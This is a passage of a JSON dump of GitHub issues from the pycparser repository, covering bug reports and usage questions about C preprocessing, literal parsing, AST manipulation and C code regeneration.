"User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-04-26T17:43:39Z", "updated_at": "2018-04-26T18:14:24Z", "closed_at": "2018-04-26T18:14:24Z", "author_association": "NONE", "active_lock_reason": null, "body": "I recently install pycparser using pip install , when i tried this snipped:\r\n\r\n`from pycparser import c_ast, parse_file\r\nclass FuncCallVisitor(c_ast.NodeVisitor):\r\n    def visit_FuncCall(self, node):\r\n        print(\"{} called at {}\".format(node.name.name, node.name.coord))\r\nast = parse_file(r\"C:\\my_file_to_parse.c\", use_cpp=True)`\r\n\r\ni got this error:\r\n\r\n`Traceback (most recent call last):\r\n  File \"<pyshell#3>\", line 1, in <module>\r\n    ast = parse_file(r\"C:\\my_file_to_parse.c\", use_cpp=True)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\__init__.py\", line 86, in parse_file\r\n    text = preprocess_file(filename, cpp_path, cpp_args)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\__init__.py\", line 49, in preprocess_file\r\n    ('Original error: %s' % e))\r\nRuntimeError: Unable to invoke 'cpp'.  Make sure its path was passed correctly\r\nOriginal error: [Error 2] The system cannot find the file specified`\r\n\r\n\r\nwhat is that `cpp` file and from where i shuld get it???\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/253", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/253/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/253/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/253/events", "html_url": "https://github.com/eliben/pycparser/issues/253", "id": 316012748, "node_id": "MDU6SXNzdWUzMTYwMTI3NDg=", "number": 253, "title": "Incorrect Parsing of Floating Point Literals", "user": {"login": "SethPoulsen", "id": 25016959, "node_id": "MDQ6VXNlcjI1MDE2OTU5", "avatar_url": "https://avatars0.githubusercontent.com/u/25016959?v=4", "gravatar_id": "", "url": "https://api.github.com/users/SethPoulsen", "html_url": "https://github.com/SethPoulsen", "followers_url": "https://api.github.com/users/SethPoulsen/followers", "following_url": "https://api.github.com/users/SethPoulsen/following{/other_user}", "gists_url": "https://api.github.com/users/SethPoulsen/gists{/gist_id}", "starred_url": "https://api.github.com/users/SethPoulsen/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/SethPoulsen/subscriptions", "organizations_url": "https://api.github.com/users/SethPoulsen/orgs", "repos_url": "https://api.github.com/users/SethPoulsen/repos", "events_url": "https://api.github.com/users/SethPoulsen/events{/privacy}", "received_events_url": "https://api.github.com/users/SethPoulsen/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-04-19T19:38:43Z", "updated_at": "2019-05-02T10:26:27Z", "closed_at": "2018-08-31T13:03:43Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Currently, the floating point literal\r\n```\r\ndouble f = 4.5;\r\n```\r\nis parsed to \r\n```\r\nDecl: f, [], [], []\r\n  TypeDecl: f, []\r\n    IdentifierType: ['double']\r\n  Constant: float, 4.5\r\n```\r\nwhen really, the `type` attribute of the `Constant` node should be \"double\". Likewise, \r\n```\r\ndouble f = 4.5L;\r\n```\r\nis parsed to \r\n```\r\nDecl: f, [], [], []\r\n  TypeDecl: f, []\r\n    IdentifierType: ['double']\r\n  Constant: float, 4.5L\r\n```\r\nwhen the `type` attribute of the `Constant` node should be \"long double\".  Note that the declared type is not what matters, it is the parsing of the floating point literal. ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/252", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/252/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/252/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/252/events", "html_url": "https://github.com/eliben/pycparser/issues/252", "id": 313703783, "node_id": "MDU6SXNzdWUzMTM3MDM3ODM=", "number": 252, "title": "Unable to parse provided examples", "user": {"login": "jhauberg", "id": 1360637, "node_id": "MDQ6VXNlcjEzNjA2Mzc=", "avatar_url": "https://avatars2.githubusercontent.com/u/1360637?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jhauberg", "html_url": "https://github.com/jhauberg", "followers_url": "https://api.github.com/users/jhauberg/followers", "following_url": "https://api.github.com/users/jhauberg/following{/other_user}", "gists_url": "https://api.github.com/users/jhauberg/gists{/gist_id}", "starred_url": "https://api.github.com/users/jhauberg/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jhauberg/subscriptions", "organizations_url": "https://api.github.com/users/jhauberg/orgs", "repos_url": "https://api.github.com/users/jhauberg/repos", "events_url": "https://api.github.com/users/jhauberg/events{/privacy}", "received_events_url": "https://api.github.com/users/jhauberg/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-04-12T12:23:33Z", "updated_at": "2019-02-10T01:48:16Z", "closed_at": "2018-04-12T12:43:22Z", "author_association": "NONE", "active_lock_reason": null, "body": "I haven't been able to successfully parse any of the provided examples (that I've tried).\r\n\r\nFor example:\r\n\r\n**func_calls.py**\r\n\r\n```\r\n[14:14:58] jhh ~/Downloads/pycparser-master\r\n$ python3 examples/func_calls.py \r\nTraceback (most recent call last):\r\n  File \"examples/func_calls.py\", line 46, in <module>\r\n    show_func_calls(filename, func)\r\n  File \"examples/func_calls.py\", line 33, in show_func_calls\r\n    ast = parse_file(filename, use_cpp=True)\r\n  File \"./pycparser/__init__.py\", line 93, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"./pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"./pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"./pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"./pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"./pycparser/c_parser.py\", line 1819, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"./pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: examples/c_files/hash.c:51:5: before: /\r\n```\r\n\r\nThis was right after downloading current master (https://github.com/eliben/pycparser/commit/902500d126d4732160c46fe525e41c017864f271), without installing.\r\n\r\nSame issue occurs after installing to `site-packages`:\r\n\r\n```\r\n[14:16:30] jhh ~/Downloads/pycparser-master\r\n$ python3 examples/func_calls.py \r\nTraceback (most recent call last):\r\n  File \"examples/func_calls.py\", line 46, in <module>\r\n    show_func_calls(filename, func)\r\n  File \"examples/func_calls.py\", line 33, in show_func_calls\r\n    ast = parse_file(filename, use_cpp=True)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/__init__.py\", line 93, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/c_parser.py\", line 1819, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: examples/c_files/hash.c:51:5: before: /\r\n```\r\n\r\n**func_defs.py**\r\n\r\n```\r\n[14:29:19] jhh ~/Downloads/pycparser-master\r\n$ python3 examples/func_defs.py \r\nIn file included from examples/c_files/memmgr.c:8:\r\nexamples/c_files/memmgr.h:37:7: warning: missing terminating ' character [-Winvalid-pp-token]\r\n// you'll probably want to keep those undefined, because\r\n      ^\r\nexamples/c_files/memmgr.h:96:8: warning: extra tokens at end of #endif directive [-Wextra-tokens]\r\n#endif // MEMMGR_H\r\n       ^\r\n       //\r\nexamples/c_files/memmgr.c:97:56: warning: missing terminating ' character [-Winvalid-pp-token]\r\n    // that if nbytes is a multiple of nquantas, we don't allocate too much\r\n                                                       ^\r\nexamples/c_files/memmgr.c:119:28: warning: missing terminating ' character [-Winvalid-pp-token]\r\n                // its prev's next to its next\r\n                           ^\r\n4 warnings generated.\r\nTraceback (most recent call last):\r\n  File \"examples/func_defs.py\", line 46, in <module>\r\n    show_func_defs(filename)\r\n  File \"examples/func_defs.py\", line 34, in show_func_defs\r\n    cpp_args=r'-Iutils/fake_libc_include')\r\n  File \"./pycparser/__init__.py\", line 93, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"./pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"./pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"./pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"./pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"./pycparser/c_parser.py\", line 1819, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"./pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: examples/c_files/memmgr.c:1:1: before: /\r\n```\r\n\r\nThis system (MacOS) is using Python 3.5.2.\r\n\r\n**EDIT:**\r\n\r\nOk, so I should have done some trivial searching before making this issue. I'm experiencing the exact same as #234.\r\n\r\nWhat fixes it is using either `clang -E` or `gcc` instead of `cpp`:\r\n\r\n```\r\nast = parse_file(filename, use_cpp=True,\r\n                     cpp_path='clang', \r\n                     cpp_args=['-E', r'-Iutils/fake_libc_include'])\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/251", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/251/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/251/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/251/events", "html_url": "https://github.com/eliben/pycparser/issues/251", "id": 313618502, "node_id": "MDU6SXNzdWUzMTM2MTg1MDI=", "number": 251, "title": "Installation on Python 3.7 raises ValueError: bad marshal data (unknown type code)", "user": {"login": "mgeier", "id": 705404, "node_id": "MDQ6VXNlcjcwNTQwNA==", "avatar_url": "https://avatars1.githubusercontent.com/u/705404?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mgeier", "html_url": "https://github.com/mgeier", "followers_url": "https://api.github.com/users/mgeier/followers", "following_url": "https://api.github.com/users/mgeier/following{/other_user}", "gists_url": "https://api.github.com/users/mgeier/gists{/gist_id}", "starred_url": "https://api.github.com/users/mgeier/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mgeier/subscriptions", "organizations_url": "https://api.github.com/users/mgeier/orgs", "repos_url": "https://api.github.com/users/mgeier/repos", "events_url": "https://api.github.com/users/mgeier/events{/privacy}", "received_events_url": "https://api.github.com/users/mgeier/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 8, "created_at": "2018-04-12T08:06:08Z", "updated_at": "2019-10-11T18:43:11Z", "closed_at": "2019-08-26T22:15:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "When installing on Python \"nightly\" on Travis-CI, I see this error:\r\n\r\n    ValueError: bad marshal data (unknown type code)\r\n\r\nFor the full output see https://travis-ci.org/bastibe/SoundFile/jobs/365467380.\r\n\r\nI searched a bit for the error message, and the recommended solutions suggest to remove `.pyc` files.\r\n\r\nSince the `pycparser` tarball contains `.pyc` files, I guess the error has something to do with them.\r\n\r\nBut I really don't know, it might be something completely different.\r\n\r\nProbably related: #135", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/248", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/248/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/248/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/248/events", "html_url": "https://github.com/eliben/pycparser/issues/248", "id": 313055183, "node_id": "MDU6SXNzdWUzMTMwNTUxODM=", "number": 248, "title": "Pragma in for loop without compound statement", "user": {"login": "were", "id": 2356965, "node_id": "MDQ6VXNlcjIzNTY5NjU=", "avatar_url": "https://avatars3.githubusercontent.com/u/2356965?v=4", "gravatar_id": "", "url": "https://api.github.com/users/were", "html_url": "https://github.com/were", "followers_url": "https://api.github.com/users/were/followers", "following_url": "https://api.github.com/users/were/following{/other_user}", "gists_url": "https://api.github.com/users/were/gists{/gist_id}", "starred_url": "https://api.github.com/users/were/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/were/subscriptions", "organizations_url": "https://api.github.com/users/were/orgs", "repos_url": "https://api.github.com/users/were/repos", "events_url": "https://api.github.com/users/were/events{/privacy}", "received_events_url": "https://api.github.com/users/were/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-04-10T19:17:30Z", "updated_at": "2018-04-25T18:26:42Z", "closed_at": "2018-04-25T18:26:42Z", "author_association": "NONE", "active_lock_reason": null, "body": "````````\r\nint i;\r\nfor (i = 0; i < 10; ++i)\r\n  #pragma something\r\n  a[i]=i;\r\n````````\r\nIt regards `#pragma` as a statement and `a[i]=i` is a statementment at the same level with the for loop.\r\nHowever semantically, it should be a compound statement.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/247", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/247/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/247/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/247/events", "html_url": "https://github.com/eliben/pycparser/issues/247", "id": 313051453, "node_id": "MDU6SXNzdWUzMTMwNTE0NTM=", "number": 247, "title": "AST Mutator?", "user": {"login": "were", "id": 2356965, "node_id": "MDQ6VXNlcjIzNTY5NjU=", "avatar_url": "https://avatars3.githubusercontent.com/u/2356965?v=4", "gravatar_id": "", "url": "https://api.github.com/users/were", "html_url": "https://github.com/were", "followers_url": "https://api.github.com/users/were/followers", "following_url": "https://api.github.com/users/were/following{/other_user}", "gists_url": "https://api.github.com/users/were/gists{/gist_id}", "starred_url": "https://api.github.com/users/were/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/were/subscriptions", "organizations_url": "https://api.github.com/users/were/orgs", "repos_url": "https://api.github.com/users/were/repos", "events_url": "https://api.github.com/users/were/events{/privacy}", "received_events_url": "https://api.github.com/users/were/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-04-10T19:05:46Z", "updated_at": "2018-04-11T19:30:11Z", "closed_at": "2018-04-11T19:30:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am writing some codes to manipulate the AST but I found there is no easy way to reform the AST structure dramatically (like injecting statements).\r\n\r\nShall I write some default AST Mutator so that it will be easier to manipulate the AST contents?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/246", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/246/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/246/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/246/events", "html_url": "https://github.com/eliben/pycparser/issues/246", "id": 309267883, "node_id": "MDU6SXNzdWUzMDkyNjc4ODM=", "number": 246, "title": "Constant expressions in designated initializers are not generated back to C", "user": {"login": "ldore", "id": 13061643, "node_id": "MDQ6VXNlcjEzMDYxNjQz", "avatar_url": "https://avatars2.githubusercontent.com/u/13061643?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ldore", "html_url": "https://github.com/ldore", "followers_url": "https://api.github.com/users/ldore/followers", "following_url": "https://api.github.com/users/ldore/following{/other_user}", "gists_url": "https://api.github.com/users/ldore/gists{/gist_id}", "starred_url": "https://api.github.com/users/ldore/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ldore/subscriptions", "organizations_url": "https://api.github.com/users/ldore/orgs", "repos_url": "https://api.github.com/users/ldore/repos", "events_url": "https://api.github.com/users/ldore/events{/privacy}", "received_events_url": "https://api.github.com/users/ldore/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2018-03-28T08:29:33Z", "updated_at": "2018-04-26T12:07:09Z", "closed_at": "2018-04-26T12:07:09Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "While pycparser correctly parses a constant-expression in a designated initializer (the AST is correct), it fails to write it back when generating C code.\r\n\r\nConsider the following code:\r\n```C\r\nvoid myFunction(void)\r\n{\r\n  int array[3] = {[0] = 0, [1] = 1, [1+1] = 2};\r\n}\r\n```\r\nParsing it, then using `CGenerator` to generate the source produces:\r\n```C\r\nvoid myFunction(void)\r\n{\r\n  int array[3] = {[0] = 0, [1] = 1, = 2};\r\n}\r\n```\r\n\r\nThe C99 grammar describes the designator part of designated initializers as:\r\n```ebnf\r\ndesignator: [ constant-expression ]\r\n            . identifier\r\n```\r\n(See \u00a76.7.8 in http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf)\r\n\r\nThe ```CGenerator.visit_NamedInitializer``` currently only considers the `ID` and `Constant` types.\r\nThe `Constant` branch should either be extended to other types or be an `else:` branch.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/244", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/244/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/244/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/244/events", "html_url": "https://github.com/eliben/pycparser/issues/244", "id": 308249508, "node_id": "MDU6SXNzdWUzMDgyNDk1MDg=", "number": 244, "title": "AST manipulation (question)", "user": {"login": "rah-hul", "id": 5926801, "node_id": "MDQ6VXNlcjU5MjY4MDE=", "avatar_url": "https://avatars1.githubusercontent.com/u/5926801?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rah-hul", "html_url": "https://github.com/rah-hul", "followers_url": "https://api.github.com/users/rah-hul/followers", "following_url": "https://api.github.com/users/rah-hul/following{/other_user}", "gists_url": "https://api.github.com/users/rah-hul/gists{/gist_id}", "starred_url": "https://api.github.com/users/rah-hul/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rah-hul/subscriptions", "organizations_url": "https://api.github.com/users/rah-hul/orgs", "repos_url": "https://api.github.com/users/rah-hul/repos", "events_url": "https://api.github.com/users/rah-hul/events{/privacy}", "received_events_url": "https://api.github.com/users/rah-hul/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-03-24T10:43:49Z", "updated_at": "2018-03-24T12:12:09Z", "closed_at": "2018-03-24T12:12:08Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\nI'm implementing functions for AST manipulation. With my limited exposure to both python and your library, I am finding it difficult to implement subtree insertion and deletion. I looked at the your rewrite AST example.\r\n\r\n`assign = ast.ext[0].body.block_items[0]`\r\n`assign.lvalue.name = \"y\"`\r\n`assign.rvalue.value = 2`\r\n\r\nThis is easy when you know the exact position. But how to do it systematically? More specifically, lets say if I want to delete node number 8 (counted by preorder traversal), how do I do it?\r\nI could get the path using a recursive solution to the node but the solution doesn't seem to be neat.\r\nAny suggestions are welcome.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/242", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/242/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/242/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/242/events", "html_url": "https://github.com/eliben/pycparser/issues/242", "id": 305611322, "node_id": "MDU6SXNzdWUzMDU2MTEzMjI=", "number": 242, "title": "Generated code not compiling with typedef named struct defining multiple types", "user": {"login": "ldore", "id": 13061643, "node_id": "MDQ6VXNlcjEzMDYxNjQz", "avatar_url": "https://avatars2.githubusercontent.com/u/13061643?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ldore", "html_url": "https://github.com/ldore", "followers_url": "https://api.github.com/users/ldore/followers", "following_url": "https://api.github.com/users/ldore/following{/other_user}", "gists_url": "https://api.github.com/users/ldore/gists{/gist_id}", "starred_url": "https://api.github.com/users/ldore/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ldore/subscriptions", "organizations_url": "https://api.github.com/users/ldore/orgs", "repos_url": "https://api.github.com/users/ldore/repos", "events_url": "https://api.github.com/users/ldore/events{/privacy}", "received_events_url": "https://api.github.com/users/ldore/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-03-15T15:51:39Z", "updated_at": "2018-03-15T22:07:32Z", "closed_at": "2018-03-15T22:07:32Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "When using a single `typedef struct` that defines multiple types, the parser converts the source to multiple single-type `typedef` nodes.\r\nThis causes problems when using a named `struct`.\r\n\r\nFor example:\r\n```c\r\ntypedef struct MyStruct {\r\n  int a;\r\n} myType, *pMyType;\r\n```\r\ncompiles correctly.\r\n\r\nHowever, once parsed, and written back to C source, we get:\r\n```c\r\ntypedef struct MyStruct {\r\n  int a;\r\n} myType;\r\ntypedef struct MyStruct {\r\n  int a;\r\n} *pMyType;\r\n```\r\nThis does not compile, as `struct MyStruct` is defined twice.\r\n```\r\nerror: redefinition of MyStruct\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/240", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/240/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/240/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/240/events", "html_url": "https://github.com/eliben/pycparser/issues/240", "id": 303322329, "node_id": "MDU6SXNzdWUzMDMzMjIzMjk=", "number": 240, "title": "Valueless enum members are generated incorrectly", "user": {"login": "natezb", "id": 3268059, "node_id": "MDQ6VXNlcjMyNjgwNTk=", "avatar_url": "https://avatars2.githubusercontent.com/u/3268059?v=4", "gravatar_id": "", "url": "https://api.github.com/users/natezb", "html_url": "https://github.com/natezb", "followers_url": "https://api.github.com/users/natezb/followers", "following_url": "https://api.github.com/users/natezb/following{/other_user}", "gists_url": "https://api.github.com/users/natezb/gists{/gist_id}", "starred_url": "https://api.github.com/users/natezb/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/natezb/subscriptions", "organizations_url": "https://api.github.com/users/natezb/orgs", "repos_url": "https://api.github.com/users/natezb/repos", "events_url": "https://api.github.com/users/natezb/events{/privacy}", "received_events_url": "https://api.github.com/users/natezb/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2018-03-08T01:27:06Z", "updated_at": "2019-06-07T22:16:53Z", "closed_at": "2019-06-07T22:16:53Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "This seems to have been introduced by #216, which inadvertently removed some special-case checks. Enum members that don't have an assigned value now generate an invalid, empty assignment. For example:\r\n```\r\ntypedef enum MOT_TravelModes\r\n{\r\n  MOT_TravelModeUndefined = ,\r\n  MOT_Linear = 0x01,\r\n  MOT_Rotational = 0x02\r\n} MOT_TravelModes;\r\n```\r\nIn the original code, `MOT_TravelModeUndefined` was assigned no value, and should be generated with no `=` sign.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/239", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/239/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/239/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/239/events", "html_url": "https://github.com/eliben/pycparser/issues/239", "id": 302614330, "node_id": "MDU6SXNzdWUzMDI2MTQzMzA=", "number": 239, "title": "ParseError: Objectffly\\SerDb.i:43:18: before: __loff_t", "user": {"login": "davidaharon", "id": 18283933, "node_id": "MDQ6VXNlcjE4MjgzOTMz", "avatar_url": "https://avatars1.githubusercontent.com/u/18283933?v=4", "gravatar_id": "", "url": "https://api.github.com/users/davidaharon", "html_url": "https://github.com/davidaharon", "followers_url": "https://api.github.com/users/davidaharon/followers", "following_url": "https://api.github.com/users/davidaharon/following{/other_user}", "gists_url": "https://api.github.com/users/davidaharon/gists{/gist_id}", "starred_url": "https://api.github.com/users/davidaharon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/davidaharon/subscriptions", "organizations_url": "https://api.github.com/users/davidaharon/orgs", "repos_url": "https://api.github.com/users/davidaharon/repos", "events_url": "https://api.github.com/users/davidaharon/events{/privacy}", "received_events_url": "https://api.github.com/users/davidaharon/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-03-06T08:58:45Z", "updated_at": "2018-03-06T13:08:11Z", "closed_at": "2018-03-06T13:08:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi I am getting the following error print:\r\n\r\nTraceback (most recent call last):\r\n  File \"C:\\Work\\RE\\Tools\\VarsExporter\\BuildExportedDb.py\", line 1076, in <module>\r\n    main()\r\n  File \"C:\\Work\\RE\\Tools\\VarsExporter\\BuildExportedDb.py\", line 1032, in main\r\n    ast = parse_file(i_file)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\__init__.py\", line 93, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\ply\\yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\c_parser.py\", line 1761, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"C:\\Python27\\lib\\site-packages\\pycparser\\plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\nParseError: Objectffly\\SerDb.i:43:18: before: __loff_t\r\n\r\nWhat causes the above issue? How Can I handle it?\r\nMaybe preprocess the .i file?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/238", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/238/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/238/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/238/events", "html_url": "https://github.com/eliben/pycparser/issues/238", "id": 302281684, "node_id": "MDU6SXNzdWUzMDIyODE2ODQ=", "number": 238, "title": "'At end of input error'", "user": {"login": "davidaharon", "id": 18283933, "node_id": "MDQ6VXNlcjE4MjgzOTMz", "avatar_url": "https://avatars1.githubusercontent.com/u/18283933?v=4", "gravatar_id": "", "url": "https://api.github.com/users/davidaharon", "html_url": "https://github.com/davidaharon", "followers_url": "https://api.github.com/users/davidaharon/followers", "following_url": "https://api.github.com/users/davidaharon/following{/other_user}", "gists_url": 